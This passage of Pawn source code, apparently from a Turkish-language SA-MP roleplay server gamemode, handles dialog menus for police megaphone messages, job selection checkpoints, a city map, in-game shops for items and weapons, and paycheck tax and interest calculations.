			if(listitem == 7)
			{
			    format(szMessage, sizeof(szMessage), "(megafon) %s: Ellerin baþýnýn üstünde kalacak þekilde araçtan in!", GetPlayerNameEx(playerid));
				ProxDetector(60.0, playerid, szMessage, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW);
			}
			if(listitem == 8)
			{
			    format(szMessage, sizeof(szMessage), "(megafon) %s: L.S.P.D Kenara çek... sen delimisin? Hepimizi öldürüyordun!", GetPlayerNameEx(playerid));
				ProxDetector(60.0, playerid, szMessage, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW);
			}
	    }
	}
	else if(dialogid == FINDJOB)
	{
		if(response)
		{
			if(listitem == 0)
			{
   				FindingJob[playerid] = 1;
			    SetPlayerCheckpoint(playerid, 1555.170654, -1675.652343, 16.195312, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "Dedektiflik mesleðini seçtin. Mesleði alabilmek için haritandaki kýrmýzý noktaya git.");

			}
			if(listitem == 1)
			{
   				FindingJob[playerid] = 2;
			    SetPlayerCheckpoint(playerid, 1380.827148, -1088.673339, 27.384355, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "Avukatlýk mesleðini seçtin. Mesleði alabilmek için haritandaki kýrmýzý noktaya git.");
			}
			if(listitem == 2)
			{
   				FindingJob[playerid] = 3;
			    SetPlayerCheckpoint(playerid, 2421.525878, -1219.291503, 25.558557, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "Hayat kadýný mesleðini seçtin. Mesleði alabilmek için haritandaki kýrmýzý noktaya git.");
			}
			if(listitem == 3)
			{
   				FindingJob[playerid] = 4;
			    SetPlayerCheckpoint(playerid, 2166.397216, -1675.312622, 15.085937, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "Uyuþturucu satýcýsýný seçtin. Mesleði satýn alabilmek için haritandaki kýrmýzý noktaya git.");
			}
			if(listitem == 4)
			{
   				FindingJob[playerid] = 5;
			    SetPlayerCheckpoint(playerid, 1907.39, -1874.70, 13.53, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "Tamirci mesleðini seçtin. Mesleði alabilmek için haritandaki kýrmýzý noktaya git.");
			}
			if(listitem == 5)
			{
   				FindingJob[playerid] = 6;
			    SetPlayerCheckpoint(playerid, 2226.128662, -1718.083984, 13.515367, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "Bodyguard mesleðini seçtin. Mesleði alabilmek için haritandaki kýrmýzý noktaya git.");
			}
			if(listitem == 6)
			{
   				FindingJob[playerid] = 7;
			    SetPlayerCheckpoint(playerid, 1366.455566, -1275.152709, 13.546875, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "Silah satýcýsýný seçtin. Mesleði alabilmek için haritandaki kýrmýzý noktaya git.");
			}
			if(listitem == 7)
			{
   				FindingJob[playerid] = 8;
			    SetPlayerCheckpoint(playerid, 2229.904052, -1721.263793, 13.561338, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "Boksörlüðü seçtin. Mesleði alabilmek için haritandaki kýrmýzý noktaya git.");
			}
			if(listitem == 8)
			{
   				FindingJob[playerid] = 9;
			    SetPlayerCheckpoint(playerid, 2354.260498, -1169.261840, 28.004892, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "Uyuþturucu kacakçýlýðýný seçtin. Mesleði alabilmek için haritandaki kýrmýzý noktaya git.");
			}
			if(listitem == 9)
			{
   				FindingJob[playerid] = 10;
			    SetPlayerCheckpoint(playerid, 2195.686035, -1972.952880, 13.558935, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "Zanaatkar mesleðini seçtin. Mesleði alabilmek için haritandaki kýrmýzý noktaya git.");
			}
			if(listitem == 10)
			{
   				FindingJob[playerid] = 11;
			    SetPlayerCheckpoint(playerid, 1836.902587, -1682.565063, 13.328538, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "Barmenliði seçtin. Mesleði alabilmek için haritandaki kýrmýzý noktaya git.");
			}
			if(listitem == 11)
			{
   				FindingJob[playerid] = 12;
			    SetPlayerCheckpoint(playerid, 2214.893798, -2661.312255, 13.546875, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "Kamyoncuyu seçtin. Mesleði alabilmek için haritandaki kýrmýzý noktaya git.");
			}
			if(listitem == 12)
			{
   				FindingJob[playerid] = 13;
			    SetPlayerCheckpoint(playerid, 2105.363037, -1806.507812, 13.554687, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "Pizzacý mesleðini seçtin. Mesleði alabilmek için haritandaki kýrmýzý noktaya git.");
			}
			if(listitem == 13)
			{
   				FindingJob[playerid] = 14;
			    SetPlayerCheckpoint(playerid, 383.403381, -2088.798339, 7.835937, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "Balýkçýlýðý seçtin. Balýk tutmak için haritandaki kýrmýzý noktaya git.");
			}
		}
	}
	else if(dialogid == HARITA)
	{
		if(response)
		{
			if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid, 1542.431884, -1675.587280, 13.554489, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "LSPD'yi seçtin, haritanda çýkan kýrmýzý noktaya git!");

			}
			if(listitem == 1)
			{
   				SetPlayerCheckpoint(playerid, 348.765075, -1512.152343, 32.969165, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "FBI'ý seçtin, haritanda çýkan kýrmýzý noktaya git!");
            }
			if(listitem == 2)
			{
   			    SetPlayerCheckpoint(playerid, 1544.757324, -2180.179931, 13.546875, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "LSFMD'i seçtin, haritanda çýkan kýrmýzý noktaya git!");
			}
			if(listitem == 3)
			{
   				SetPlayerCheckpoint(playerid, 1529.646850, -1673.496704, 13.382812, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "LS Merkez'i seçtin, haritanda çýkan kýrmýzý noktaya git!");
			}
			if(listitem == 4)
			{
   				SetPlayerCheckpoint(playerid, 2096.905517, -1807.264038, 13.552999, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "Pizzacý'yý seçtin, haritanda çýkan kýrmýzý noktaya git!");
			}
  	        if(listitem == 5)
			{
   				SetPlayerCheckpoint(playerid, 2217.546386, -2644.021972, 13.546875, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "Kamyoncuyu seçtin, haritanda çýkan kýrmýzý noktaya git!");
			}
			if(listitem == 6)
			{
   				SetPlayerCheckpoint(playerid, 1315.356445, -1387.445800, 13.562341, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "VIP Mekaný'ný seçtin, haritanda çýkan kýrmýzý noktaya git!");
			}
			if(listitem == 7)
			{
   				SetPlayerCheckpoint(playerid, 844.619934, -591.173767, 17.786298, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "DMV Binasý'ný seçtin, haritanda çýkan kýrmýzý noktaya git!");
			}
		}
	}
	if(dialogid == STOREMENU)
	{
		if(response)
		{
			if(listitem == 0)
			{
				if(GetPlayerCash(playerid) >= 100)
				{
				    new idx = GetPlayerVirtualWorld(playerid)-100;
					new randphone = 1000 + random(99999);//minimum 1000  max 99999
					ReplacePH(PlayerInfo[playerid][pNumber], randphone);
					PlayerInfo[playerid][pNumber] = randphone;
 					PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
					PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
					GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
					GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
					GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
					OnPlayerStatsUpdate(playerid);
					BizInfo[idx][bMoney] += 100;
					format(string, sizeof(string), "Telefon satýn alýndý, yeni telefon numaran %d.", randphone);
					SendClientMessage(playerid, COLOR_GRAD4, string);
					SendClientMessage(playerid, COLOR_GRAD5, "Telefonun bilgini /karakterim yazarak daima görebilirsin.");
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: /telefonyardim yazarak telefon komutlarýný görebilirsin.");
					BizInfo[idx][bProducts] --;
                    BizInfo[idx][bSold] ++;					
					GivePlayerCash(playerid, -100);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 1)
			{
				if(GetPlayerCash(playerid) >= 20)
				{
                    new idx = GetPlayerVirtualWorld(playerid)-100;
					PlayerInfo[playerid][pPhoneBook] = 1;
					BizInfo[idx][bMoney] += 20;
					format(string, sizeof(string), "Telefon defteri satýn alýndý. Diðer oyuncularýn telefon numarasýna bakabilirsin..");
					SendClientMessage(playerid, COLOR_GRAD4, string);
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: /numara [Oyuncu ID/Isim]");
					GivePlayerCash(playerid, -20);
					GameTextForPlayer(playerid, "~r~-20 $", 3000, 1);
					BizInfo[idx][bProducts] --;
                    BizInfo[idx][bSold] ++;
				}
				else
				{
				SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 2)
			{
				if(GetPlayerCash(playerid) >= 20)
				{
                    new idx = GetPlayerVirtualWorld(playerid)-100;
					PlayerInfo[playerid][pDice] = 1;
					BizInfo[idx][bMoney] += 20;
					BizInfo[idx][bProducts] --;
					GameTextForPlayer(playerid, "~r~-20 $", 3000, 1);
                    BizInfo[idx][bSold] ++;
					format(string, sizeof(string), "Zar satýn alýndý.");
					SendClientMessage(playerid, COLOR_GRAD4, string);
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: /zarat yazarak zar atabilirsin.");			
					GivePlayerCash(playerid, -20);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 3)
			{
				if(GetPlayerCash(playerid) >= 7)
				{
                    new idx = GetPlayerVirtualWorld(playerid)-100;
					Condom[playerid] ++;
					BizInfo[idx][bMoney] += 7;
					BizInfo[idx][bProducts] --;
                    BizInfo[idx][bSold] ++;
                    GameTextForPlayer(playerid, "~r~-7 $", 3000, 1);
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					format(string, sizeof(string), "Kondom satýn alýndý.");
					SendClientMessage(playerid, COLOR_GRAD4, string);
					GivePlayerCash(playerid, -7);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 4)
			{
				if(GetPlayerCash(playerid) >= 50)
				{
                    new idx = GetPlayerVirtualWorld(playerid)-100;
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					SendClientMessage(playerid, COLOR_GRAD4, "CD Player satin alindi.");
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: /muzik yaz.");
					PlayerInfo[playerid][pCDPlayer] = 1;
					BizInfo[idx][bMoney] += 50;
					GameTextForPlayer(playerid, "~r~-50 $", 3000, 1);
					BizInfo[idx][bProducts] --;
                    BizInfo[idx][bSold] ++;
					GivePlayerCash(playerid, -50);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 5)
			{
				if(GetPlayerCash(playerid) >= 50)
				{
                    new idx = GetPlayerVirtualWorld(playerid)-100;
					if(PlayerInfo[playerid][pSpraycan] < 20) {
						PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
						PlayerInfo[playerid][pSpraycan] += 10;
						BizInfo[idx][bMoney] += 50;
						BizInfo[idx][bProducts] --;
                        BizInfo[idx][bSold] ++;
                        GameTextForPlayer(playerid, "~r~-50 $", 3000, 1);
						SendClientMessage(playerid, COLOR_GRAD4, "10 Araçboyasý alýndý.");
						SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Aracýn içerisindeyken /araciboya ve /boyaisi komutlariyla aracini boyayabilirsin.");
						GivePlayerCash(playerid, -50);
					}
					else SendClientMessage(playerid, COLOR_GRAD4, "Bu eþyadan daha fazla bulunduramazsýn.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 6)
			{
				if(GetPlayerCash(playerid) >= 100)
				{
					if(PlayerInfo[playerid][pRope] < 8) {
                        new idx = GetPlayerVirtualWorld(playerid)-100;
						PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
						PlayerInfo[playerid][pRope] += 3;
						BizInfo[idx][bMoney] += 100;
						BizInfo[idx][bProducts] --;
                        BizInfo[idx][bSold] ++;						
						SendClientMessage(playerid, COLOR_GRAD4, "3 tane ip satýn aldýn.");
						SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Birini baðlamak için araç sürerken /bagla yaz.");
						GivePlayerCash(playerid, -100);
					}
					else SendClientMessage(playerid, COLOR_GRAD4, "Bu eþyadan daha fazla bulunduramazsýn.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 7)
			{
				if(GetPlayerCash(playerid) >= 10)
				{
                    new idx = GetPlayerVirtualWorld(playerid)-100;
				    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					PlayerInfo[playerid][pCigar] = 10;
					BizInfo[idx][bMoney] += 10;
					BizInfo[idx][bProducts] --;
					GameTextForPlayer(playerid, "~r~-10 $", 3000, 1);
                    BizInfo[idx][bSold] ++;
					SendClientMessage(playerid, COLOR_GRAD4, "10 sigara satýn alýndý.");
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Sigara yakmak için /sigara komutunu kullan. Ýçmek için ise mousenin sol tuþuna bas. Fýrlatmak için ise F tuþuna bas.");
					GivePlayerCash(playerid, -10);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 8)
			{
				if(GetPlayerCash(playerid) >= 10)
				{
                    new idx = GetPlayerVirtualWorld(playerid)-100;
				    if(PlayerInfo[playerid][pSprunk] >= 10)
				        return SendClientMessage(playerid, COLOR_GREY, "Daha fazla gazoz taþýyamazsýn.");

				    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					PlayerInfo[playerid][pSprunk] += 10;
					BizInfo[idx][bMoney] += 10;
					BizInfo[idx][bProducts] --;
                    BizInfo[idx][bSold] ++;
                    GameTextForPlayer(playerid, "~r~-10 $", 3000, 1);
					SendClientMessage(playerid, COLOR_GRAD4, "10 adet gazoz satin alýndi.");
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Gazoz içmek için /gazozic yaz ve mousenin sol tuþuna basarak iç. Atmak için ise F tuþuna bas.");
					GivePlayerCash(playerid, -10);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 9)
			{
				if(GetPlayerCash(playerid) >= 500)
				{
                    new idx = GetPlayerVirtualWorld(playerid)-100;
				    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					PlayerInfo[playerid][pRadio] = 1;
					PlayerInfo[playerid][pRadioFreq] = 1;
					BizInfo[idx][bMoney] += 500;
					BizInfo[idx][bProducts] --;
                    BizInfo[idx][bSold] ++;
                    GameTextForPlayer(playerid, "~r~-500 $", 3000, 1);
					SendClientMessage(playerid, COLOR_GRAD4, "Portatif radyo satýn alýndý.");
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Portatif radyondan konuþmak için /pr komutunu kullan.");
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Radyo frekansýný deðiþtirmek için /frekans komutunu kullan.");
					GivePlayerCash(playerid, -500);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 10)
			{
				if(GetPlayerCash(playerid) >= 60)
				{
                    new idx = GetPlayerVirtualWorld(playerid)-100;
				    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					PlayerInfo[playerid][pRope] = 1;
					BizInfo[idx][bMoney] += 60;
					GameTextForPlayer(playerid, "~r~-60 $", 3000, 1);
					BizInfo[idx][bProducts] --;
                    BizInfo[idx][bSold] ++;
					SendClientMessage(playerid, COLOR_GRAD4, "Göz baðý satýn alýndý. /gozbagla yazarak göz baðlayabilirsin.");
					GivePlayerCash(playerid, -60);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 11)
			{
				if(GetPlayerCash(playerid) >= 50)
				{
                   new idx = GetPlayerVirtualWorld(playerid)-100;
				    if(PlayerInfo[playerid][pGas] >= 3)
				        return SendClientMessage(playerid, COLOR_GREY, "Daha fazla benzin kutusu taþýyamazsýn!");

				    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					PlayerInfo[playerid][pGas] += 1;
					BizInfo[idx][bMoney] += 50;
					GameTextForPlayer(playerid, "~r~-50 $", 3000, 1);
					BizInfo[idx][bProducts] --;
                    BizInfo[idx][bSold] ++;
					SendClientMessage(playerid, COLOR_GRAD4, "1 adet benzin kutusu satýn alýndý!");
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Aracýnýzý benzinle doldurmak için /benzinkutusu yazmalýsýnýz.");
					GivePlayerCash(playerid, -50);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}	
		}
	}

	
		if(dialogid == 3153)
	{
		if(response)
		{
			if(listitem == 0)
			{
				if(GetPlayerCash(playerid) >= 350)
				{
				    new idx = GetPlayerVirtualWorld(playerid)-100;
					PlayerInfo[playerid][pGPS] = 1;
					BizInfo[idx][bMoney] += 350;
                    BizInfo[idx][bProducts] --;
                    BizInfo[idx][bSold] ++;
                    GameTextForPlayer(playerid, "~r~-350 $", 3000, 1);
					format(string, sizeof(string), "/gps komutunu kullanarak GPS cihazýný çalýþtýrabilirsin.");
					SendClientMessage(playerid, COLOR_GRAD4, string);
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: /gps <id/isim>.");
					GivePlayerCash(playerid, -350);
				}
				else
				{
				SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 1)
			{
				if(GetPlayerCash(playerid) >= 5)
				{
					GivePlayerCash(playerid, -50);
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					SendClientMessage(playerid, COLOR_GRAD4, "CD Player satin alindi.");
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: /muzik yaz.");
					PlayerInfo[playerid][pCDPlayer] = 1;
					GivePlayerCash(playerid, -5);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
		}
	}

   		if(dialogid == 3154)
	{
		if(response)
		{
			if(listitem == 0)
			{
				if(GetPlayerCash(playerid) >= 4999)
				{
				    new idx = GetPlayerVirtualWorld(playerid)-100;
    				GivePlayerValidWeapon(playerid, 24, 99999);
					BizInfo[idx][bMoney] += 5000;
                    BizInfo[idx][bProducts] --;
                    BizInfo[idx][bSold] ++;
                    GameTextForPlayer(playerid, "~r~-5000 $", 3000, 1);
					format(string, sizeof(string), "{FF0000} Desert Eagle adlý silahý satýn aldýnýz.");
					SendClientMessage(playerid, COLOR_GRAD4, string);
					GivePlayerCash(playerid, -5000);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu silahý alabilmek için yeterli miktarda paraya sahip olmalýsýnýz !");
				}
			}
			if(listitem == 1)
			{
				if(GetPlayerCash(playerid) >= 3499)
				{
				    new idx = GetPlayerVirtualWorld(playerid)-100;
    				GivePlayerValidWeapon(playerid, 22, 99999);
					BizInfo[idx][bMoney] += 3500;
                    BizInfo[idx][bProducts] --;
                    BizInfo[idx][bSold] ++;
                    GameTextForPlayer(playerid, "~r~-3500 $", 3000, 1);
					format(string, sizeof(string), "{FF0000} Colt 45 adlý silahý satýn aldýnýz.");
					SendClientMessage(playerid, COLOR_GRAD4, string);
					GivePlayerCash(playerid, -3500);
				}
				else
				{
				SendClientMessage(playerid, COLOR_GRAD4, "Bu silahý alabilmek için yeterli miktarda paraya sahip olmalýsýnýz !");
				}
			}
			if(listitem == 2)
			{
				if(GetPlayerCash(playerid) >= 3749)
				{
				    new idx = GetPlayerVirtualWorld(playerid)-100;
    				GivePlayerValidWeapon(playerid, 23, 99999);
					BizInfo[idx][bMoney] += 3750;
                    BizInfo[idx][bProducts] --;
                    BizInfo[idx][bSold] ++;
                    GameTextForPlayer(playerid, "~r~-3750 $", 3000, 1);
					format(string, sizeof(string), "{FF0000}Susturuculu Colt 45 adlý silahý satýn aldýnýz.");
					SendClientMessage(playerid,
					COLOR_GRAD4, string);
					GivePlayerCash(playerid, -3750);
				}
				else
				{
				SendClientMessage(playerid, COLOR_GRAD4, "Bu silahý alabilmek için yeterli miktarda paraya sahip olmalýsýnýz !");
				}
			}
   			if(listitem == 3)
			{
				if(GetPlayerCash(playerid) >= 5499)
				{
				    new idx = GetPlayerVirtualWorld(playerid)-100;
    				GivePlayerValidWeapon(playerid, 25, 99999);
					BizInfo[idx][bMoney] += 5500;
                    BizInfo[idx][bProducts] --;
                    BizInfo[idx][bSold] ++;
                    GameTextForPlayer(playerid, "~r~-5500 $", 3000, 1);
					format(string, sizeof(string), "{FF0000}Shotgun adlý silahý satýn aldýnýz.");
					SendClientMessage(playerid, COLOR_GRAD4, string);
					GivePlayerCash(playerid, -5500);
				}
				else
				{
				SendClientMessage(playerid, COLOR_GRAD4, "Bu silahý alabilmek için yeterli miktarda paraya sahip olmalýsýnýz !");
				}
			}
			
			if(listitem == 4)
			{
				if(GetPlayerCash(playerid) >= 999)
				{
				    new idx = GetPlayerVirtualWorld(playerid)-100;
        			SetPlayerArmourEx(playerid, 100);
					BizInfo[idx][bMoney] += 1000;
                    BizInfo[idx][bProducts] --;
                    BizInfo[idx][bSold] ++;
                    GameTextForPlayer(playerid, "~r~-1000 $", 3000, 1);
					format(string, sizeof(string), "{FF0000}Çelik Yelek satýn aldýnýz.");
					SendClientMessage(playerid, COLOR_GRAD4, string);
					GivePlayerCash(playerid, -1000);
				}
				else
				{
				SendClientMessage(playerid, COLOR_GRAD4, "Çelik Yelek alabilmek için yeterli miktarda paraya sahip olmalýsýnýz !");
				}
			}
			if(listitem == 5)
			{
				if(GetPlayerCash(playerid) >= 349)
				{
				    new idx = GetPlayerVirtualWorld(playerid)-100;
				 	SetPlayerHealth(playerid, 100);
					BizInfo[idx][bMoney] += 350;
                    BizInfo[idx][bProducts] --;
                    BizInfo[idx][bSold] ++;
                    GameTextForPlayer(playerid, "~r~-350 $", 3000, 1);
					format(string, sizeof(string), "{FF0000}Ýlk yardým kiti satýn aldýnýz.");
					SendClientMessage(playerid, COLOR_GRAD4, string);
					GivePlayerCash(playerid, -350);
				}
				else
				{
				SendClientMessage(playerid, COLOR_GRAD4, "Ýlk yardým kiti alabilmek için yeterli miktarda paraya sahip olmalýsýnýz !");
				}
			}
		}
   }
    else if(dialogid == SIGNCHECK)
	{
 		if(!response) return 1;
		new
			szMessage[150];
   		if(strlen(inputtext) < 1)
		{
            format(szMessage, sizeof(szMessage), "Ýmzalamadan önce çek kodunu girmek zorundasýn.\n\nÇek kodu: %d\n\nMaaþýný alabilmek için çek kodunu gir.", PayCheckCode[playerid]);
			ShowPlayerDialogEx(playerid, SIGNCHECK, DIALOG_STYLE_INPUT, "Çek imzala", szMessage, "Çek imzala","Iptal");
			return 1;
        }
		if(!IsNumeric(inputtext))
		{
 			format(szMessage, sizeof(szMessage), "Yanlýþ çek kodu. Çek kodu yalnýzca rakam içerir.\n\nÇek kodu: %d\n\nMaaþýný alabilmek için çek kodunu gir.", PayCheckCode[playerid]);
			ShowPlayerDialogEx(playerid, SIGNCHECK, DIALOG_STYLE_INPUT, "Çek imzala", szMessage, "Çek imzala","Iptal");
			return 1;
		}
        if(strlen(inputtext) > 6 || (strlen(inputtext) > 0 && strlen(inputtext) < 6))
		{
           	format(szMessage, sizeof(szMessage), "Yanlýþ çek kodu. Çek kodu 6 rakam içerir.\n\nÇek kodu: %d\n\nMaaþýný alabilmek için çek kodunu gir.", PayCheckCode[playerid]);
			ShowPlayerDialogEx(playerid, SIGNCHECK, DIALOG_STYLE_INPUT, "Çek imzala", szMessage, "Çek imzala","Iptal");
			return 1;
        }

        new code = strval(inputtext);
        if(code == PayCheckCode[playerid])
		{
            PayCheckCode[playerid] = 0;

			// VIP Disabled
			/*if(PlayerInfo[i][pDonator] > 0)
			{
    			PlayerInfo[i][pPayCheck] += PlayerInfo[i][pPayCheck] / 2;
			}*/

            new PayCheck = PlayerInfo[playerid][pPayCheck] / 10;


            new TaxCost;
            new TaxPercentage;
            if(PayCheck < 1250)
            {
				TaxPercentage = 10;
				TaxCost = (PayCheck / 100) * 10;
			}
			else if(PayCheck >= 1250 && PayCheck <= 1999)
			{
			    TaxPercentage = 15;
			    TaxCost = (PayCheck / 100) * 15;
			}
			else if(PayCheck >= 2000 && PayCheck <= 2499)
			{
			    TaxPercentage = 25;
			    TaxCost = (PayCheck / 100) * 25;
			}
			else if(PayCheck >= 2500 && PayCheck <= 3499)
			{
			    TaxPercentage = 30;
			    TaxCost = (PayCheck / 100) * 30;
			}
			else if(PayCheck >= 3500)
			{
			    TaxPercentage = 35;
			    TaxCost = (PayCheck / 100) * 35;
			}

            SendClientMessage(playerid, COLOR_WHITE, "________ BANKA AÇIKLAMASI ________");
            format(string, sizeof(string), "  Maaþ: $%d |  Vergi: $%d (yüzde %d)", PayCheck, TaxCost, TaxPercentage);
            SendClientMessage(playerid, COLOR_GRAD1, string);

			// VIP Disabled
			/*switch(PlayerInfo[i][pDonator])
			{
    			case 0:
    			{
        			if(interest > 50000) interest = 50000;
        			format(string, sizeof(string), "  Balance: $%d  |  Interest rate: 0.1 percent (5k max)", PlayerInfo[i][pBank]);
        			SendClientMessage(i, COLOR_GRAD1, string);
    			}
    			case 1:
    			{
   			 		if(interest > 100000) interest = 100000;
					format(string, sizeof(string), "  Balance: $%d  |  Interest rate: 0.1 percent {FFFF00}(Ruby Donator: 100k max)", PlayerInfo[i][pBank]);
					SendClientMessage(i, COLOR_GRAD1, string);
				}
				case 2:
				{
					if(interest > 150000) interest = 150000;
					format(string, sizeof(string), "  Balance: $%d  |  Interest rate: 0.1 percent {FFFF00}(Sapphire Donator: 150k max)", PlayerInfo[i][pBank]);
					SendClientMessage(i, COLOR_GRAD1, string);
				}
				case 3:
				{
					if(interest > 200000) interest = 200000;
					format(string, sizeof(string), "  Balance: $%d  |  Interest rate: 0.1 percent {FFFF00}(Diamond Donator: 200k max)", PlayerInfo[i][pBank]);
					SendClientMessage(i, COLOR_GRAD1, string);
				}
				case 4, 5:
				{
					if(interest > 250000) interest = 250000;
					format(string, sizeof(string), "  Balance: $%d  |  Interest rate: 0.1 percent {FFFF00}(Undefined Donator: 250k max)", PlayerInfo[i][pBank]);
					SendClientMessage(i, COLOR_GRAD1, string);
				}
			}*/

            new interest;
            if(PlayerInfo[playerid][pDonator] == 0) interest = PlayerInfo[playerid][pBank] / 1000;
            else if(PlayerInfo[playerid][pDonator] == 1) interest = PlayerInfo[playerid][pBank] / 500;
            else if(PlayerInfo[playerid][pDonator] == 2) interest = PlayerInfo[playerid][pBank] / 333;
            else if(PlayerInfo[playerid][pDonator] == 3) interest = PlayerInfo[playerid][pBank] / 200;

            if(interest > 5000) interest = 5000;

            if(PlayerInfo[playerid][pDonator] == 0) format(string, sizeof(string), "  Eski Bakiye: $%d  |  Faiz oraný: yüzde 0.1 (5k max)", PlayerInfo[playerid][pBank]);
            else if(PlayerInfo[playerid][pDonator] == 1) format(string, sizeof(string), "  Eski Bakiye: $%d  |  Faiz oraný: yüzde 0.2 (5k max)", PlayerInfo[playerid][pBank]);
            else if(PlayerInfo[playerid][pDonator] == 2) format(string, sizeof(string), "  Eski Bakiye: $%d  |  Faiz oraný: yüzde 0.3 (5k max)", PlayerInfo[playerid][pBank]);
            else if(PlayerInfo[playerid][pDonator] == 3) format(string, sizeof(string), "  Eski Bakiye: $%d  |  Faiz oraný: yüzde 0.5 (5k max)", PlayerInfo[playerid][pBank]);

            SendClientMessage(playerid, COLOR_GRAD1, string);

			if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pFaction] == 5 || PlayerInfo[playerid][pFaction] == 9) {
				if(PlayerInfo[playerid][pRank] == 0) {
					PlayerInfo[playerid][pBank] += FACTION_PAY_PER_RANK / 2;
					format(string,sizeof(string),"  Oluþum Ödemesi: $%d", FACTION_PAY_PER_RANK / 2);
					SendClientMessage(playerid, COLOR_GRAD2, string);
				} else {
					PlayerInfo[playerid][pBank] += PlayerInfo[playerid][pRank] * FACTION_PAY_PER_RANK;
					format(string,sizeof(string),"  Oluþum Ödemesi: $%d", PlayerInfo[playerid][pRank] * 300);
					SendClientMessage(playerid, COLOR_GRAD2, string);
				}
			}
	
            //Tax += TaxCost;
            PlayerInfo[playerid][pBank] += PayCheck;
            PlayerInfo[playerid][pBank] += interest;
            PlayerInfo[playerid][pBank] -= TaxCost;

            format(string, sizeof(string), "  Alýnan Faiz: $%d", interest);
            SendClientMessage(playerid, COLOR_GRAD3, string);
            SendClientMessage(playerid, COLOR_GRAD4, "______________________________________");
